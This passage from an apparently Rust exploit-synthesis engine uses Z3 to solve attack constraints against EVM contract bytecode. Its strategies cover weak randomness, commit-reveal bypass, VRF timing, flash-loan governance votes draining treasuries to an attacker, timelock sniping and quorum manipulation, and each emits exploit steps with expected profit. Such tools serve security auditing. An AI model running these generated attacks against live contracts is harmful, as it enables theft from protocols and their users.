impl ExploitObjective for AmmPriceImpactObjective {
    fn name(&self) -> &str {
        "AMM Price Impact (Slippage) Modeling"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "amm_price_impact_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::amm_price_impact::known_amm_price_impact_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(12));

            let amount_in = BV::new_const(ctx, "amm_impact_amount_in", 256);
            let liquidity = BV::new_const(ctx, "amm_impact_liquidity", 256);
            let sqrt_price_before = BV::new_const(ctx, "amm_impact_sqrt_before", 256);
            let liquidation_profit = BV::new_const(ctx, "amm_impact_liquidation_profit", 256);
            let zero = crate::symbolic::utils::math::zero(ctx);
            let max_input = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );
            let max_profit = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );
            let sqrt_price_max = BV::from_u64(ctx, 1, 256)
                .bvshl(&BV::from_u64(ctx, 160, 256))
                .bvsub(&BV::from_u64(ctx, 1, 256));

            solver.assert(&amount_in.bvugt(&zero));
            solver.assert(&amount_in.bvule(&max_input));
            solver.assert(&liquidity.bvugt(&zero));
            solver.assert(&sqrt_price_before.bvugt(&zero));
            solver.assert(&sqrt_price_before.bvule(&sqrt_price_max));
            solver.assert(&liquidation_profit.bvugt(&zero));
            solver.assert(&liquidation_profit.bvule(&max_profit));

            let amount_out = crate::protocols::uniswap_v3::get_amount_out(
                ctx,
                &amount_in,
                &liquidity,
                &sqrt_price_before,
                true,
                self.fee_pips,
            );
            solver.assert(&amount_in.bvugt(&amount_out));
            let attack_cost = amount_in.bvsub(&amount_out);
            solver.assert(&attack_cost.bvugt(&zero));

            let sqrt_price_after = crate::protocols::amm_price_impact::sqrt_price_x96_after_input(
                ctx,
                &amount_in,
                &liquidity,
                &sqrt_price_before,
                true,
                self.fee_pips,
            );
            solver.assert(&sqrt_price_after.bvult(&sqrt_price_before));
            solver.assert(
                &crate::protocols::amm_price_impact::sqrt_price_drop_exceeds_bps(
                    ctx,
                    &sqrt_price_before,
                    &sqrt_price_after,
                    self.min_price_impact_bps,
                ),
            );

            // No fantasy dumps: slippage cost must be strictly below expected liquidation profit.
            solver.assert(&liquidation_profit.bvugt(&attack_cost));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            Some(ExploitParams {
                flash_loan_amount: U256::ZERO,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_amm_price_impact_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_weak_prng_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 16: Weak Randomness Risk Model
/// Detects weak entropy (`TIMESTAMP`/`PREVRANDAO`/`BLOCKHASH`) and solves modulo-win constraints.
pub struct WeakPrngObjective {
    pub rpc_url: String,
    pub max_timestamp_drift_seconds: u64,
    pub min_modulo: u64,
    pub max_modulo: u64,
}

impl ExploitObjective for WeakPrngObjective {
    fn name(&self) -> &str {
        "Weak Randomness Risk Model"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::prng::has_weak_prng_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "weak_prng_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> = crate::protocols::prng::known_weak_prng_selectors()
                .iter()
                .map(|selector| Bytes::copy_from_slice(selector))
                .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(10));

            let timestamp_current = BV::new_const(ctx, "weak_prng_timestamp_current", 256);
            let timestamp_next = BV::new_const(ctx, "weak_prng_timestamp_next", 256);
            let prevrandao = BV::new_const(ctx, "weak_prng_prevrandao", 256);
            let prev_blockhash = BV::new_const(ctx, "weak_prng_prev_blockhash", 256);
            let modulo = BV::new_const(ctx, "weak_prng_modulo", 256);
            let winning_value = BV::new_const(ctx, "weak_prng_winning_value", 256);
            let zero = crate::symbolic::utils::math::zero(ctx);

            let min_modulo = self.min_modulo.max(2);
            let max_modulo = self.max_modulo.max(min_modulo);
            solver.assert(&timestamp_current.bvugt(&zero));
            solver.assert(&crate::protocols::prng::next_block_timestamp_in_range(
                ctx,
                &timestamp_current,
                &timestamp_next,
                self.max_timestamp_drift_seconds,
            ));
            solver.assert(&prevrandao.bvugt(&zero));
            solver.assert(&prev_blockhash.bvugt(&zero));
            solver.assert(&modulo.bvuge(&BV::from_u64(ctx, min_modulo, 256)));
            solver.assert(&modulo.bvule(&BV::from_u64(ctx, max_modulo, 256)));

            let attacker_word = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from_be_bytes(scenario.attacker.into_word().into()),
            );
            let keccak = crate::symbolic::z3_ext::KeccakTheory::new(ctx);
            let entropy_hash = keccak.apply_symbolic(Some(vec![
                timestamp_next.clone(),
                prevrandao.clone(),
                attacker_word,
            ]));
            let random_value = entropy_hash.bvxor(&prev_blockhash);

            solver.assert(&crate::protocols::prng::wins_modulo(
                ctx,
                &random_value,
                &modulo,
                &winning_value,
            ));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            Some(ExploitParams {
                flash_loan_amount: U256::ZERO,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_weak_prng_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_commit_reveal_bypass_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 17: Commit-Reveal Integrity Risk
/// Solves reveal-winning inputs when the commit seed is derivable from on-chain state.
pub struct CommitRevealBypassObjective {
    pub rpc_url: String,
    pub max_timestamp_drift_seconds: u64,
    pub min_modulo: u64,
    pub max_modulo: u64,
}

impl ExploitObjective for CommitRevealBypassObjective {
    fn name(&self) -> &str {
        "Commit-Reveal Integrity Risk"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::commit_reveal::has_commit_reveal_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "commit_reveal_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::commit_reveal::known_commit_reveal_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(10));

            let timestamp_current = BV::new_const(ctx, "commit_reveal_timestamp_current", 256);
            let timestamp_next = BV::new_const(ctx, "commit_reveal_timestamp_next", 256);
            let prevrandao = BV::new_const(ctx, "commit_reveal_prevrandao", 256);
            let stored_commit_hash = BV::new_const(ctx, "commit_reveal_stored_hash", 256);
            let leaked_seed = BV::new_const(ctx, "commit_reveal_leaked_seed", 256);
            let modulo = BV::new_const(ctx, "commit_reveal_modulo", 256);
            let winning_value = BV::new_const(ctx, "commit_reveal_winning_value", 256);
            let zero = crate::symbolic::utils::math::zero(ctx);

            let min_modulo = self.min_modulo.max(2);
            let max_modulo = self.max_modulo.max(min_modulo);

            solver.assert(&timestamp_current.bvugt(&zero));
            solver.assert(&crate::protocols::prng::next_block_timestamp_in_range(
                ctx,
                &timestamp_current,
                &timestamp_next,
                self.max_timestamp_drift_seconds,
            ));
            solver.assert(&prevrandao.bvugt(&zero));
            solver.assert(&stored_commit_hash.bvugt(&zero));
            solver.assert(&leaked_seed.bvugt(&zero));
            solver.assert(&modulo.bvuge(&BV::from_u64(ctx, min_modulo, 256)));
            solver.assert(&modulo.bvule(&BV::from_u64(ctx, max_modulo, 256)));

            solver.assert(&crate::protocols::commit_reveal::hash_matches_preimage(
                ctx,
                &stored_commit_hash,
                &leaked_seed,
            ));
            solver.assert(&crate::protocols::commit_reveal::reveal_outcome_wins(
                ctx,
                &leaked_seed,
                &timestamp_next,
                &prevrandao,
                &modulo,
                &winning_value,
            ));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            Some(ExploitParams {
                flash_loan_amount: U256::ZERO,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_commit_reveal_bypass_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_gambling_contract_scanner_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 18: Entropy-Sensitive Contract Scanner
/// Detects contracts combining weak entropy and value-transfer surfaces, then solves winning bet constraints.
pub struct GamblingContractScannerObjective {
    pub rpc_url: String,
    pub max_timestamp_drift_seconds: u64,
    pub min_modulo: u64,
    pub max_modulo: u64,
}

impl ExploitObjective for GamblingContractScannerObjective {
    fn name(&self) -> &str {
        "Entropy-Sensitive Contract Scanner"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::prng::has_gambling_contract_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "gambling_scanner_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::prng::known_gambling_scanner_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(
                crate::protocols::prng::known_weak_prng_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector)),
            );
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(12));

            let timestamp_current = BV::new_const(ctx, "gambling_scan_timestamp_current", 256);
            let timestamp_next = BV::new_const(ctx, "gambling_scan_timestamp_next", 256);
            let prevrandao = BV::new_const(ctx, "gambling_scan_prevrandao", 256);
            let prev_blockhash = BV::new_const(ctx, "gambling_scan_prev_blockhash", 256);
            let wager_value = BV::new_const(ctx, "gambling_scan_wager_value", 256);
            let payout_value = BV::new_const(ctx, "gambling_scan_payout_value", 256);
            let modulo = BV::new_const(ctx, "gambling_scan_modulo", 256);
            let winning_value = BV::new_const(ctx, "gambling_scan_winning_value", 256);
            let zero = crate::symbolic::utils::math::zero(ctx);
            let max_value = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );

            let min_modulo = self.min_modulo.max(2);
            let max_modulo = self.max_modulo.max(min_modulo);
            solver.assert(&timestamp_current.bvugt(&zero));
            solver.assert(&crate::protocols::prng::next_block_timestamp_in_range(
                ctx,
                &timestamp_current,
                &timestamp_next,
                self.max_timestamp_drift_seconds,
            ));
            solver.assert(&prevrandao.bvugt(&zero));
            solver.assert(&prev_blockhash.bvugt(&zero));
            solver.assert(&wager_value.bvugt(&zero));
            solver.assert(&wager_value.bvule(&max_value));
            solver.assert(&payout_value.bvugt(&wager_value));
            solver.assert(&payout_value.bvule(&max_value));
            solver.assert(&modulo.bvuge(&BV::from_u64(ctx, min_modulo, 256)));
            solver.assert(&modulo.bvule(&BV::from_u64(ctx, max_modulo, 256)));

            let attacker_word = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from_be_bytes(scenario.attacker.into_word().into()),
            );
            let keccak = crate::symbolic::z3_ext::KeccakTheory::new(ctx);
            let entropy_hash = keccak.apply_symbolic(Some(vec![
                timestamp_next.clone(),
                prevrandao.clone(),
                attacker_word,
                wager_value.clone(),
            ]));
            let random_value = entropy_hash.bvxor(&prev_blockhash);

            solver.assert(&crate::protocols::prng::wins_modulo(
                ctx,
                &random_value,
                &modulo,
                &winning_value,
            ));
            // Scanner objective enforces a non-trivial positive edge on winning path.
            solver.assert(&payout_value.bvugt(&wager_value));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            Some(ExploitParams {
                flash_loan_amount: U256::ZERO,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_gambling_contract_scanner_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_chainlink_vrf_timing_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 19: Chainlink VRF Timing Risk
/// Detects VRF fulfill->claim surfaces and solves same-block claim win constraints.
pub struct ChainlinkVrfTimingAttackObjective {
    pub rpc_url: String,
    pub min_modulo: u64,
    pub max_modulo: u64,
}

impl ExploitObjective for ChainlinkVrfTimingAttackObjective {
    fn name(&self) -> &str {
        "Chainlink VRF Timing Risk"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::chainlink_vrf::has_vrf_timing_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "vrf_timing_attack_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::chainlink_vrf::known_vrf_claim_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(
                crate::protocols::chainlink_vrf::known_vrf_fulfill_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector)),
            );
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(12));

            let fulfill_block = BV::new_const(ctx, "vrf_fulfill_block", 256);
            let claim_block = BV::new_const(ctx, "vrf_claim_block", 256);
            let random_word = BV::new_const(ctx, "vrf_random_word", 256);
            let modulo = BV::new_const(ctx, "vrf_modulo", 256);
            let winning_value = BV::new_const(ctx, "vrf_winning_value", 256);
            let claim_payout = BV::new_const(ctx, "vrf_claim_payout", 256);
            let claim_cost = BV::new_const(ctx, "vrf_claim_cost", 256);
            let zero = crate::symbolic::utils::math::zero(ctx);
            let max_value = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );

            let min_modulo = self.min_modulo.max(2);
            let max_modulo = self.max_modulo.max(min_modulo);
            solver.assert(&crate::protocols::chainlink_vrf::same_block_claim_window(
                ctx,
                &fulfill_block,
                &claim_block,
            ));
            solver.assert(&random_word.bvugt(&zero));
            solver.assert(&modulo.bvuge(&BV::from_u64(ctx, min_modulo, 256)));
            solver.assert(&modulo.bvule(&BV::from_u64(ctx, max_modulo, 256)));
            solver.assert(&claim_cost.bvuge(&zero));
            solver.assert(&claim_cost.bvule(&max_value));
            solver.assert(&claim_payout.bvugt(&claim_cost));
            solver.assert(&claim_payout.bvule(&max_value));

            solver.assert(&crate::protocols::chainlink_vrf::vrf_claim_wins(
                ctx,
                &random_word,
                &modulo,
                &winning_value,
            ));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            Some(ExploitParams {
                flash_loan_amount: U256::ZERO,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_chainlink_vrf_timing_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_governance_flash_vote_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 20: Governance Flash-Loan Voting
/// Detects current-balance voting paths and solves quorum + treasury-drain constraints.
pub struct GovernanceExploitObjective {
    pub rpc_url: String,
    pub min_quorum_threshold: u64,
    pub max_quorum_threshold: u64,
}

impl ExploitObjective for GovernanceExploitObjective {
    fn name(&self) -> &str {
        "Governance Flash-Loan Voting Risk"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::governance::has_flash_loan_governance_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "governance_flash_vote_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::governance::known_governance_flash_vote_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(12));

            let quorum_threshold = BV::new_const(ctx, "governance_quorum_threshold", 256);
            let voting_power = BV::new_const(ctx, "governance_voting_power", 256);
            let transfer_to = BV::new_const(ctx, "governance_transfer_to", 256);
            let transfer_amount = BV::new_const(ctx, "governance_transfer_amount", 256);
            let treasury_balance = BV::new_const(ctx, "governance_treasury_balance", 256);
            let max_value = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );

            let min_quorum = self.min_quorum_threshold.max(1);
            let max_quorum = self.max_quorum_threshold.max(min_quorum);
            solver.assert(&scenario.flash_loan_amount.bvugt(&zero(ctx)));
            solver.assert(&scenario.flash_loan_amount.bvule(&max_value));
            solver.assert(&quorum_threshold.bvuge(&BV::from_u64(ctx, min_quorum, 256)));
            solver.assert(&quorum_threshold.bvule(&BV::from_u64(ctx, max_quorum, 256)));
            solver.assert(&voting_power.bvuge(&scenario.flash_loan_amount));
            solver.assert(&voting_power.bvule(&max_value));
            solver.assert(&treasury_balance.bvugt(&zero(ctx)));
            solver.assert(&treasury_balance.bvule(&max_value));
            solver.assert(&transfer_amount.bvule(&max_value));

            solver.assert(&crate::protocols::governance::flash_loan_meets_quorum(
                ctx,
                &scenario.flash_loan_amount,
                &quorum_threshold,
            ));

            let attacker_word = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from_be_bytes(scenario.attacker.into_word().into()),
            );
            solver.assert(&crate::protocols::governance::proposal_transfers_treasury(
                ctx,
                &transfer_to,
                &attacker_word,
                &transfer_amount,
                &treasury_balance,
            ));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            let model = solver.get_model()?;
            let flash_loan_amount = model
                .eval::<BV>(&scenario.flash_loan_amount, true)
                .and_then(|v| u256_from_bv(&v))
                .filter(|amount| !amount.is_zero())?;
            let expected_profit = model
                .eval::<BV>(&treasury_balance, true)
                .and_then(|v| u256_from_bv(&v))
                .filter(|amount| !amount.is_zero())
                .unwrap_or(U256::from(1u64));

            Some(ExploitParams {
                flash_loan_amount,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_governance_flash_vote_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(expected_profit),
                block_offsets: None,
            })
        })
    }
}

fn build_timelock_expiry_sniping_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 21: Timelock Expiry Execution Risk
/// Detects queue->execute timelock flows and solves deterministic execution-window constraints.
pub struct TimelockExpirySnipingObjective {
    pub rpc_url: String,
    pub max_eta_horizon_seconds: u64,
}

impl ExploitObjective for TimelockExpirySnipingObjective {
    fn name(&self) -> &str {
        "Timelock Expiry Execution Risk"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::timelock::has_timelock_expiry_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "timelock_sniping_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::timelock::known_timelock_sniper_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(12));

            let current_timestamp = BV::new_const(ctx, "timelock_current_timestamp", 256);
            let eta = BV::new_const(ctx, "timelock_eta", 256);
            let payout_value = BV::new_const(ctx, "timelock_payout_value", 256);
            let execution_cost = BV::new_const(ctx, "timelock_execution_cost", 256);
            let max_value = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );
            let max_eta_horizon = BV::from_u64(ctx, self.max_eta_horizon_seconds.max(1), 256);
            let eta_deadline = eta.bvadd(&max_eta_horizon);
            let no_eta_overflow = eta_deadline.bvuge(&eta);

            solver.assert(&crate::protocols::timelock::timelock_window_open(
                ctx,
                &current_timestamp,
                &eta,
            ));
            solver.assert(&no_eta_overflow);
            solver.assert(&current_timestamp.bvule(&eta_deadline));
            solver.assert(&execution_cost.bvule(&max_value));
            solver.assert(&payout_value.bvule(&max_value));
            solver.assert(&payout_value.bvugt(&execution_cost));

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            Some(ExploitParams {
                flash_loan_amount: U256::ZERO,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_timelock_expiry_sniping_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_quorum_manipulation_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 22: Quorum Concentration Risk
/// Detects dynamic total-supply quorum flows and solves temporary supply-inflation vote paths.
pub struct QuorumManipulationObjective {
    pub rpc_url: String,
    pub quorum_ratio_bps: u64,
    pub min_mint_amount: u64,
    pub max_mint_amount: u64,
}

impl ExploitObjective for QuorumManipulationObjective {
    fn name(&self) -> &str {
        "Quorum Concentration Risk"
    }

    fn execute(&self, bytecode: &Bytes) -> Option<ExploitParams> {
        if !crate::protocols::governance::has_quorum_manipulation_pattern(bytecode) {
            return None;
        }

        run_with_z3_solver(|ctx, solver| {
            let rpc_url = self.rpc_url.clone();
            let scenario = crate::solver::setup::StandardScenario::try_new(
                ctx,
                solver,
                &rpc_url,
                bytecode,
                "quorum_manipulation_loan",
            )
            .ok()?;

            let mut selectors: Vec<Bytes> =
                crate::protocols::governance::known_quorum_manipulation_selectors()
                    .iter()
                    .map(|selector| Bytes::copy_from_slice(selector))
                    .collect();
            selectors.extend(crate::solver::setup::selectors_from_context_or_scan(
                bytecode,
            ));
            selectors.sort();
            selectors.dedup();
            if selectors.is_empty() {
                return None;
            }
            selectors.truncate(selectors.len().min(12));

            let attacker_balance = BV::new_const(ctx, "quorum_attacker_balance", 256);
            let total_supply = BV::new_const(ctx, "quorum_total_supply", 256);
            let mint_amount = BV::new_const(ctx, "quorum_mint_amount", 256);
            let min_mint_amount = self.min_mint_amount.max(1);
            let max_mint_amount = self.max_mint_amount.max(min_mint_amount);
            let max_value = crate::symbolic::z3_ext::bv_from_u256(
                ctx,
                U256::from(10u64).pow(U256::from(30u64)),
            );

            solver.assert(&scenario.flash_loan_amount.bvugt(&zero(ctx)));
            solver.assert(&scenario.flash_loan_amount.bvule(&max_value));
            solver.assert(&attacker_balance.bvuge(&scenario.flash_loan_amount));
            solver.assert(&attacker_balance.bvule(&max_value));
            solver.assert(&total_supply.bvugt(&zero(ctx)));
            solver.assert(&total_supply.bvule(&max_value));
            solver.assert(&mint_amount.bvuge(&BV::from_u64(ctx, min_mint_amount, 256)));
            solver.assert(&mint_amount.bvule(&BV::from_u64(ctx, max_mint_amount, 256)));

            solver.assert(
                &crate::protocols::governance::quorum_ratio_satisfied_after_mint(
                    ctx,
                    &attacker_balance,
                    &total_supply,
                    &mint_amount,
                    self.quorum_ratio_bps.clamp(1, 10_000),
                ),
            );

            if solver.check() != z3::SatResult::Sat {
                return None;
            }

            let model = solver.get_model()?;
            let flash_loan_amount = model
                .eval::<BV>(&scenario.flash_loan_amount, true)
                .and_then(|v| u256_from_bv(&v))
                .filter(|amount| !amount.is_zero())?;

            Some(ExploitParams {
                flash_loan_amount,
                flash_loan_token: Address::ZERO,
                flash_loan_provider: Address::ZERO,
                flash_loan_legs: Vec::new(),
                steps: build_quorum_manipulation_steps(scenario.contract_addr, &selectors),
                expected_profit: Some(U256::from(1u64)),
                block_offsets: None,
            })
        })
    }
}

fn build_delegatee_hijack_steps(target: Address, selectors: &[Bytes]) -> Vec<ExploitStep> {
    let mut payloads = selectors.iter().take(3).cloned().collect::<Vec<_>>();
    if payloads.is_empty() {
        payloads.push(Bytes::new());
    }
    payloads
        .into_iter()
        .map(|call_data| ExploitStep {
            target,
            call_data,
            execute_if: None,
        })
        .collect()
}

/// Strategy 23: Delegation Control Reassignment Risk
/// Detects unauthenticated delegate flows where non-owner callers can redirect votes to attacker.
pub struct DelegateeHijackObjective {
    pub rpc_url: String,
}
